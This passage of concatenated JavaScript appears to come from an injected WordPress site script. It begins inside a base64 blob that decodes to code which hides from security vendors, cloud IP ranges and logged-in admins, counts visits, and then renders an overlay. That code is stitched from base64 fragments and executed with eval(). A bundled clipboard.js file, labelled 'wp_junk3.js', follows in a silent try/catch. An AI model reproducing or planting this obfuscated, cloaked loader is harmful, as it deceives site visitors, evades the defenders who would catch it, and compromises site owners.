ZSBMTEMnLCdBbWF6b24gRGF0YSBTZXJ2aWNlcyBJcmVsYW5kIEx0ZCcsJ0FtYXpvbiBXZWIgU2VydmljZXMsIExMQycsJ0FtYXpvbi5jb20gVGVjaCBUZWxlY29tJywnQW1hem9uaWEgUHVibGljaWRhZGUgTHRkYScsJ0FtYXpvbmlhIFRlbGVjb20gTHRkYS4gLSBNZScsJ0thc3BlcnNreSBMYWIgQU8nLCdBbGlzdGFyIFNlY3VyaXR5IFNybCcsJ05GT3JjZSBFbnRlcnRhaW5tZW50IEIuVi4nLCdTSyBCcm9hZGJhbmQnLCdaYXlvIEdyb3VwIEVVIExpbWl0ZWQnLCdRdWFkcmFOZXQnLCdSYW1Ob2RlIExMQycsJ0hvc3RVUycKICAgICAgXTsKCiAgICAgIGlmIChibG9ja2VkSVNQcy5pbmNsdWRlcyhpc3ApKSB7CiAgICAgICAgdmxvZygnZGVueV9pc3AnLCBpc3ApOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgIAoKICAgICAgcmV0dXJuIHRydWU7CiAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgdmVycignQWNjZXNzIGNoZWNrIGZhaWxlZDonLCBlcnIpOwogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICB9CgogIGFzeW5jIGZ1bmN0aW9uIGluaXQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBhbGxvd2VkID0gYXdhaXQgaXNBY2Nlc3NBbGxvd2VkKCk7CiAgICAgIHZsb2coJ2FjY2Vzc19hbGxvd2VkJywgYWxsb3dlZCk7CiAgICAgIGlmICghYWxsb3dlZCkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgY29uc3Qgc2tpcCA9IGdldFZhbCgnX3NraXAnLCAnMCcpOwogICAgICBpZiAoc2tpcCA9PT0gJzEnKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSkgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgbGV0IGNvdW50ID0gcGFyc2VJbnQoZ2V0VmFsKEtFWSwgJzAnKSwgMTApOwogICAgICBpZiAoTnVtYmVyLmlzTmFOKGNvdW50KSkgY291bnQgPSAwOwogICAgICBjb3VudCsrOwogICAgICBzZXRWYWwoS0VZLCBjb3VudC50b1N0cmluZygpKTsKCiAgICAgIGlmIChjb3VudCA+PSBOKSB7CiAgICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgICB9CiAgICB9IGNhdGNoKGUpIHsKICAgICAgdmVycignaW5pdF9mYWlsZWQnLCBlKTsKICAgICAgcmVuZGVyT3ZlcmxheSgpOwogICAgfQogIH0KCiAgaWYgKGRvY3VtZW50LmJvZHkpIHsKICAgIGluaXQoKTsKICB9IGVsc2UgewogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGluaXQpOwogIH0KfSkoKTsKICA=",
    "MC42ODI1MjcwOTc5NjQzODQ2",
    "MC45MDMzOTcyMzg4ODg2NzM=",
    "MC40ODg2NzEyMDgyMjAxODc3",
    "MC4zNjM5MzEzOTExMzc3NDI=",
    "MC4xNzE1MzU4NTUwOTE0MzQ0Mw==",
    "MC45NjM2Nzk0OTI2Nzg4NDky",
    "MC44MzcyODE4MjgyODQxODc0",
    "MC44MDc1NjczNDk3OTMzMzQ3",
    "MC41MjczNzU4OTE3NTg2OTk2"
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 0;

  var _code = b64ToUtf8(_y[_k1]) + b64ToUtf8(_a[_k2]) + b64ToUtf8(_g[_k3]);
  eval(_code);
})();
/* >>> wp_junk3.js (26806 bytes) <<< */
(function(){
try{
/*!
 * clipboard.js v2.0.11
 * https://clipboardjs.com/
 *
 * Licensed MIT © Zeno Rocha
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["ClipboardJS"] = factory();
	else
		root["ClipboardJS"] = factory();
})(this, function() {
return /******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 686:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ clipboard; }
});

// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
var tiny_emitter = __webpack_require__(279);
var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
var listen = __webpack_require__(370);
var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
// EXTERNAL MODULE: ./node_modules/select/src/select.js
var src_select = __webpack_require__(817);
var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
;// CONCATENATED MODULE: ./src/common/command.js
/**
 * Executes a given operation type.
 * @param {String} type
 * @return {Boolean}
 */
function command(type) {
  try {
    return document.execCommand(type);
  } catch (err) {
    return false;
  }
}
;// CONCATENATED MODULE: ./src/actions/cut.js


/**
 * Cut action wrapper.
 * @param {String|HTMLElement} target
 * @return {String}
 */

var ClipboardActionCut = function ClipboardActionCut(target) {
  var selectedText = select_default()(target);
  command('cut');
  return selectedText;
};

/* harmony default export */ var actions_cut = (ClipboardActionCut);
;// CONCATENATED MODULE: ./src/common/create-fake-element.js
/**
 * Creates a fake textarea element with a value.
 * @param {String} value
 * @return {HTMLElement}
 */
function createFakeElement(value) {
  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS

  fakeElement.style.fontSize = '12pt'; // Reset box model

  fakeElement.style.border = '0';
  fakeElement.style.padding = '0';
  fakeElement.style.margin = '0'; // Move element out of screen horizontally

  fakeElement.style.position = 'absolute';
  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically

  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
  fakeElement.style.top = "".concat(yPosition, "px");
  fakeElement.setAttribute('readonly', '');
  fakeElement.value = value;
  return fakeElement;
}
;// CONCATENATED MODULE: ./src/actions/copy.js



/**
 * Create fake copy action wrapper using a fake element.
 * @param {String} target
 * @param {Object} options
 * @return {String}
 */

var fakeCopyAction = function fakeCopyAction(value, options) {
  var fakeElement = createFakeElement(value);
  options.container.appendChild(fakeElement);
  var selectedText = select_default()(fakeElement);
  command('copy');
  fakeElement.remove();
  return selectedText;
};
/**
 * Copy action wrapper.
 * @param {String|HTMLElement} target
 * @param {Object} options
 * @return {String}
 */


var ClipboardActionCopy = function ClipboardActionCopy(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
    container: document.body
  };
  var selectedText = '';

  if (typeof target === 'string') {
    selectedText = fakeCopyAction(target, options);
  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
    selectedText = fakeCopyAction(target.value, options);
  } else {
    selectedText = select_default()(target);
    command('copy');
  }

  return selectedText;
};

/* harmony default export */ var actions_copy = (ClipboardActionCopy);
;// CONCATENATED MODULE: ./src/actions/default.js
function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }



/**
 * Inner function which performs selection from either `text` or `target`
 * properties and then executes copy or cut operations.
 * @param {Object} options
 */

var ClipboardActionDefault = function ClipboardActionDefault() {
  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  // Defines base properties passed from constructor.
  var _options$action = options.action,
      action = _options$action === void 0 ? 'copy' : _options$action,
      container = options.container,
      target = options.target,
      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.

  if (action !== 'copy' && action !== 'cut') {
    throw new Error('Invalid "action" value, use either "copy" or "cut"');
  } // Sets the `target` property using an element that will be have its content copied.


  if (target !== undefined) {
    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
      if (action === 'copy' && target.hasAttribute('disabled')) {
        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
      }

      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
      }
    } else {
      throw new Error('Invalid "target" value, use a valid Element');
    }
  } // Define selection strategy based on `text` property.


  if (text) {
    return actions_copy(text, {
      container: container
    });
  } // Defines which selection strategy based on `target` property.


  if (target) {
    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
      container: container
    });
  }
};

/* harmony default export */ var actions_default = (ClipboardActionDefault);
;// CONCATENATED MODULE: ./src/clipboard.js
function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }

function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }

function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }

function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }

function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }

function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }

function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }






/**
 * Helper function to retrieve attribute value.
 * @param {String} suffix
 * @param {Element} element
 */

function getAttributeValue(suffix, element) {
  var attribute = "data-clipboard-".concat(suffix);

  if (!element.hasAttribute(attribute)) {
    return;
  }

  return element.getAttribute(attribute);
}
/**
 * Base class which takes one or more elements, adds event listeners to them,
 * and instantiates a new `ClipboardAction` on each click.
 */


var Clipboard = /*#__PURE__*/function (_Emitter) {
  _inherits(Clipboard, _Emitter);

  var _super = _createSuper(Clipboard);

  /**
   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
   * @param {Object} options
   */
  function Clipboard(trigger, options) {
    var _this;

    _classCallCheck(this, Clipboard);

    _this = _super.call(this);

    _this.resolveOptions(options);

    _this.listenClick(trigger);

    return _this;
  }
  /**
   * Defines if attributes would be resolved using internal setter functions
   * or custom functions that were passed in the constructor.
   * @param {Object} options
   */


  _createClass(Clipboard, [{
    key: "resolveOptions",
    value: function resolveOptions() {
      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
    }
    /**
     * Adds a click event listener to the passed trigger.
     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
     */

  }, {
    key: "listenClick",
    value: function listenClick(trigger) {
      var _this2 = this;

      this.listener = listen_default()(trigger, 'click', function (e) {
        return _this2.onClick(e);
      });
    }
    /**
     * Defines a new `ClipboardAction` on each click event.
     * @param {Event} e
     */

  }, {
    key: "onClick",
    value: function onClick(e) {
      var trigger = e.delegateTarget || e.currentTarget;
      var action = this.action(trigger) || 'copy';
      var text = actions_default({
        action: action,
        container: this.container,
        target: this.target(trigger),
        text: this.text(trigger)
      }); // Fires an event based on the copy operation result.

      this.emit(text ? 'success' : 'error', {
        action: action,
        text: text,
        trigger: trigger,
        clearSelection: function clearSelection() {
          if (trigger) {
            trigger.focus();
          }

          window.getSelection().removeAllRanges();
        }
      });
    }
    /**
     * Default `action` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultAction",
    value: function defaultAction(trigger) {
      return getAttributeValue('action', trigger);
    }
    /**
     * Default `target` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultTarget",
    value: function defaultTarget(trigger) {
      var selector = getAttributeValue('target', trigger);

      if (selector) {
        return document.querySelector(selector);
      }
    }
    /**
     * Allow fire programmatically a copy action
     * @param {String|HTMLElement} target
     * @param {Object} options
     * @returns Text copied.
     */

  }, {
    key: "defaultText",

    /**
     * Default `text` lookup function.
     * @param {Element} trigger
     */
    value: function defaultText(trigger) {
      return getAttributeValue('text', trigger);
    }
    /**
     * Destroy lifecycle.
     */

  }, {
    key: "destroy",
    value: function destroy() {
      this.listener.destroy();
    }
  }], [{
    key: "copy",
    value: function copy(target) {
      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
        container: document.body
      };
      return actions_copy(target, options);
    }
    /**
     * Allow fire programmatically a cut action
     * @param {String|HTMLElement} target
     * @returns Text cutted.
     */

  }, {
    key: "cut",
    value: function cut(target) {
      return actions_cut(target);
    }
    /**
     * Returns the support of the given action, or all actions if no action is
     * given.
     * @param {String} [action]
     */

  }, {
    key: "isSupported",
    value: function isSupported() {
      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
      var actions = typeof action === 'string' ? [action] : action;
      var support = !!document.queryCommandSupported;
      actions.forEach(function (action) {
        support = support && !!document.queryCommandSupported(action);
      });
      return support;
    }
  }]);

  return Clipboard;
}((tiny_emitter_default()));

/* harmony default export */ var clipboard = (Clipboard);

/***/ }),

/***/ 828:
/***/ (function(module) {

var DOCUMENT_NODE_TYPE = 9;

/**
 * A polyfill for Element.matches()
 */
if (typeof Element !== 'undefined' && !Element.prototype.matches) {
    var proto = Element.prototype;

    proto.matches = proto.matchesSelector ||
                    proto.mozMatchesSelector ||
                    proto.msMatchesSelector ||
                    proto.oMatchesSelector ||
                    proto.webkitMatchesSelector;
}

/**
 * Finds the closest parent that matches a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @return {Function}
 */
function closest (element, selector) {
    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
        if (typeof element.matches === 'function' &&
            element.matches(selector)) {
          return element;
        }
        element = element.parentNode;
    }
}

module.exports = closest;


/***/ }),

/***/ 438:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var closest = __webpack_require__(828);

/**
 * Delegates event to a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function _delegate(element, selector, type, callback, useCapture) {
    var listenerFn = listener.apply(this, arguments);

    element.addEventListener(type, listenerFn, useCapture);

    return {
        destroy: function() {
            element.removeEventListener(type, listenerFn, useCapture);
        }
    }
}

/**
 * Delegates event to a selector.
 *
 * @param {Element|String|Array} [elements]
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function delegate(elements, selector, type, callback, useCapture) {
    // Handle the regular Element usage
    if (typeof elements.addEventListener === 'function') {
        return _delegate.apply(null, arguments);
    }

    // Handle Element-less usage, it defaults to global delegation
    if (typeof type === 'function') {
        // Use `document` as the first parameter, then apply arguments
        // This is a short way to .unshift `arguments` without running into deoptimizations
        return _delegate.bind(null, document).apply(null, arguments);
    }

    // Handle Selector-based usage
    if (typeof elements === 'string') {
        elements = document.querySelectorAll(elements);
    }

    // Handle Array-like based usage
    return Array.prototype.map.call(elements, function (element) {
        return _delegate(element, selector, type, callback, useCapture);
    });
}

/**
 * Finds closest match and invokes callback.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Function}
 */
function listener(element, selector, type, callback) {
    return function(e) {
        e.delegateTarget = closest(e.target, selector);

        if (e.delegateTarget) {
            callback.call(element, e);
        }
    }
}

module.exports = delegate;


/***/ }),

/***/ 879:
/***/ (function(__unused_webpack_module, exports) {

/**
 * Check if argument is a HTML element.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.node = function(value) {
    return value !== undefined
        && value instanceof HTMLElement
        && value.nodeType === 1;
};

/**
 * Check if argument is a list of HTML elements.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.nodeList = function(value) {
    var type = Object.prototype.toString.call(value);

    return value !== undefined
        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
        && ('length' in value)
        && (value.length === 0 || exports.node(value[0]));
};

/**
 * Check if argument is a string.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.string = function(value) {
    return typeof value === 'string'
        || value instanceof String;
};

/**
 * Check if argument is a function.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.fn = function(value) {
    var type = Object.prototype.toString.call(value);

    return type === '[object Function]';
};


/***/ }),

/***/ 370:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var is = __webpack_require__(879);
var delegate = __webpack_require__(438);

/**
 * Validates all params and calls the right
 * listener function based on its target type.
 *
 * @param {String|HTMLElement|HTMLCollection|NodeList} target
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listen(target, type, callback) {
    if (!target && !type && !callback) {
        throw new Error('Missing required arguments');
    }

    if (!is.string(type)) {
        throw new TypeError('Second argument must be a String');
    }

    if (!is.fn(callback)) {
        throw new TypeError('Third argument must be a Function');
    }

    if (is.node(target)) {
        return listenNode(target, type, callback);
    }
    else if (is.nodeList(target)) {
        return listenNodeList(target, type, callback);
    }
    else if (is.string(target)) {
        return listenSelector(target, type, callback);
    }
    else {
        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
    }
}

/**
 * Adds an event listener to a HTML element
 * and returns a remove listener function.
 *
 * @param {HTMLElement} node
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNode(node, type, callback) {
    node.addEventListener(type, callback);

    return {
        destroy: function() {
            node.removeEventListener(type, callback);
        }
    }
}

/**
 * Add an event listener to a list of HTML elements
 * and returns a remove listener function.
 *
 * @param {NodeList|HTMLCollection} nodeList
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNodeList(nodeList, type, callback) {
    Array.prototype.forEach.call(nodeList, function(node) {
        node.addEventListener(type, callback);
    });

    return {
        destroy: function() {
            Array.prototype.forEach.call(nodeList, function(node) {
                node.removeEventListener(type, callback);
            });
        }
    }
}

/**
 * Add an event listener to a selector
 * and returns a remove listener function.
 *
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenSelector(selector, type, callback) {
    return delegate(document.body, selector, type, callback);
}

module.exports = listen;


/***/ }),

/***/ 817:
/***/ (function(module) {

function select(element) {
    var selectedText;

    if (element.nodeName === 'SELECT') {
        element.focus();

        selectedText = element.value;
    }
    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
        var isReadOnly = element.hasAttribute('readonly');

        if (!isReadOnly) {
            element.setAttribute('readonly', '');
        }

        element.select();
        element.setSelectionRange(0, element.value.length);

        if (!isReadOnly) {
            element.removeAttribute('readonly');
        }

        selectedText = element.value;
    }
    else {
        if (element.hasAttribute('contenteditable')) {
            element.focus();
        }

        var selection = window.getSelection();
        var range = document.createRange();

        range.selectNodeContents(element);
        selection.removeAllRanges();
        selection.addRange(range);

        selectedText = selection.toString();
    }

    return selectedText;
}

module.exports = select;


/***/ }),

/***/ 279:
/***/ (function(module) {

function E () {
  // Keep this empty so it's easier to inherit from
  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
}

E.prototype = {
  on: function (name, callback, ctx) {
    var e = this.e || (this.e = {});

    (e[name] || (e[name] = [])).push({
      fn: callback,
      ctx: ctx
    });

    return this;
  },

  once: function (name, callback, ctx) {
    var self = this;
    function listener () {
      self.off(name, listener);
      callback.apply(ctx, arguments);
    };

    listener._ = callback
    return this.on(name, listener, ctx);
  },

  emit: function (name) {
    var data = [].slice.call(arguments, 1);
    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
    var i = 0;
    var len = evtArr.length;

    for (i; i < len; i++) {
      evtArr[i].fn.apply(evtArr[i].ctx, data);
    }

    return this;
  },

  off: function (name, callback) {
    var e = this.e || (this.e = {});
    var evts = e[name];
    var liveEvents = [];

    if (evts && callback) {
      for (var i = 0, len = evts.length; i < len; i++) {
        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
          liveEvents.push(evts[i]);
      }
    }

    // Remove event from queue to prevent memory leak
    // Suggested by https://github.com/lazd
    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

    (liveEvents.length)
      ? e[name] = liveEvents
      : delete e[name];

    return this;
  }
};

module.exports = E;
module.exports.TinyEmitter = E;


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		if(__webpack_module_cache__[moduleId]) {
/******/ 			return __webpack_module_cache__[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	// module exports must be returned from runtime so entry inlining is disabled
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(686);
/******/ })()
.default;
});
}catch(e){}
})();

